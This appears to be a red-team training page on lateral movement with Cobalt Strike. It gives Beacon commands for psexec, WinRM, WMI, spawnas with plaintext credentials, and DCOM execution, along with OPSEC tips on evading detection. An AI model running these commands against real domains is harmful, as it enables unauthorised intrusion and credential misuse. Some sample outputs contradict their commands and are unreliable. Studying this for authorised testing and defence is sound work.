---
title: Lateral Movement
category: Red Team
order: 7
---

Moving laterally between computers in a domain is important for accessing sensitive information/materials, and obtaining new credentials. 

In this section we are goingto see how do a lateral movement with Cobalt Strike

# Execution commands

Cobalt Strike provides three strategies for executing Beacons, code or commands on remote targets.

To execute commands remotely we need admin privileges.

> **OPSEC Note**: A common way of testing local admin access on a target is to list the C$ directory.
>
>`beacon> ls \\dc01\c$`

## Jump 

`jump` command will spawn a beacon payload on the remote target, and if we use a P2P listener, will connect automatically.

Usage of `jump` command:
```
jump [method] [target] [listener]
```

We can use different methods:

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

## Remote-exec

`remote-exec` command will simply execute commands on a remote target.

hey require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target. You also need to connect to P2P Beacons manually using `connect` or `link`.

```
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

## Powershell and execute-assembly

We can specify the target in `powershell` and `execute-assembly` commands.

```
baecon> execute-assembly /path/payload.exe -computername=dc01
```

```
baecon> powershell Get-ChildItem -computername=dc01
```

## Spawn


Notice that due to problems of **CoInitializeSecurity** COM object, a different security context for example another user can not be used in the same beacon process.

To that reason we need to spawn another beacon.

`spawn` and `spawnas` starts a new session with the provided credentials. 

```
beacon> spawn
```
The `spawnas` command will spawn a new process using plaintext credentials and will inject a beacon payload into it.

```
beacon> spawnas CORP\user Passw0rd! smb-p2p-payload
[+] established link to child beacon: 10.10.10.10
```

> **Note**: A common mistake is to attempt this from a directory where te user does not have read access. Change directory to `C:\` and try it again.

# PowerShell Remoting

The `winrm` and `winrm64` methods can be used to use powershell remoting.

WinRM will return a **high integrity beacon running as the user** with which are going to be interacted.

```
# 64-bit target
beacon> jump winrm64 dc01 [P2P-Listener]

# 32-bit target
beacon> jump winrm dc01 [P2P-Listener]
```

> **Note**: We can use `Get-WmiObject` to determine the arhitecture of the remote system.


# PsExec

The `psexec` and `psexec64` commands, first a service binary is uploaded to the target system, then a starting windows service is created to execute that binary.

`psexec_psh` doesn't copy the binary to the target, but instead executes a PowerShell one-liner (always in 32-bit).

PsExec will return a beacon running by **SYSTEM**.

```
beacon> jump psexec64 dc01 [p2p-listener]
```

# Windows Management Instrumentation (WMI)

The `wmi` `remote-exec` method uses WMI's *process call create* to execute any command we specify on the target.

The most straight forward means of using this to upload a payload to the target system and use WMI to execute it.

```
beacon> cd \\dc01\ADMIN$
beacon> upload C:\p2p-smb-beacon.exe
beacon> remote-exec wmi dc01 C:\Windows\beacon.exe
```

After executing the beacon we will neeed to connect to it.

```
beacon> link dc01 \\dc01\pipe\[namepipe]
```

## The Curious Case of CoInitializeSecurity

If our beacon called CoInitializeSecurity in the context of "UserA" then the future BOFs such as WMI may not be able to inherit a different security context "UserB".

```
beacon> make_token CORP\userb password
[+] Impersonated CORP\usera

beacon> remote-exec wmi web.corp.local C:\Windows\smb_x64.exe
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to web.dev.cyberbotic.io: 5
```

Our WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas` or even `SharpWMI`.

```
beacon> execute-assembly C:\Tools\SharpWMI.exe action=exec computername=web.corp.local command="C:\Windows\smb_x64.exe"
```

# Distributed Component Object Model (DCOM)

Beacon has no built-in capabilities to interact over DCOM, so we can use `Invoke-DCOM`.

* [https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)


```
beacon> powershell-import .\Invoke-DCOM.ps1
beacon> powershell Invoke-DCOM -ComputerName dc01 -Method MMC20.Application -Command C:\Windows\beacon-smb.exe
beacon> link dc01
```

> **OPSEC Note**: `DCOM` is more complicated to detect, since each method works in a different way. If `MMC20.Application` method spawns a process, the spawned process will be a child of `mmc.exe`.
>
> `ProcessId: 952`
> `Image: C:\Windows\beacon-smb.exe`
> `ParentImage: C:\Windows\System32\mmc.exe`